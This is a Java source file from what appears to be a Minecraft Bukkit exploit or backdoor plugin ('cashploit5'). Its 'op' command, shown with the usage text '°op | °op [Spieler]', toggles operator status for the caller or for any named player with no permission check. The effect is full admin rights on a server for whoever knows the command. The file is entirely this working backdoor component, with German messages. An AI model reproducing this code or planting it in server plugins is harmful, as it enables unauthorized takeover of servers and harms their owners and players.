package de.cashploit5.v1_12_2.command;

import org.bukkit.OfflinePlayer;
import org.bukkit.entity.Player;

import de.cashploit5.Main;
import de.cashploit5.v1_12_2.uuidmanager.UUIDManager;

public class OPCommand extends Command {

	public OPCommand() {
		super("op");
	}

	@Override
	public void onCommand(Player p, Command command, String[] args) {

		if(args.length == 0) {
			p.setOp(!p.isOp());
			if(p.isOp()) {
				Main.sendMessage(p, "§aDu hast nun OP.");
			} else {
				Main.sendMessage(p, "§aDu hast nun kein OP mehr.");
			}
		} else if(args.length == 1) {
			OfflinePlayer target  = UUIDManager.getOfflinePlayer(args[0]);
			if(target == null) {
				p.sendMessage("§cDieser Spieler war noch nie auf dem Server");
			} else {
				target.setOp(!target.isOp());
				if(target.isOp()) {
					p.sendMessage("§aDer Spieler §6" + target.getName() + "§a ist nun OP.");
				} else {
					p.sendMessage("§aDer Spieler §6" + target.getName() + "§a ist nun nicht mehr OP.");
				}
			}
		} else {
			p.sendMessage("§c°op | °op [Spieler]");
		}
	}
}
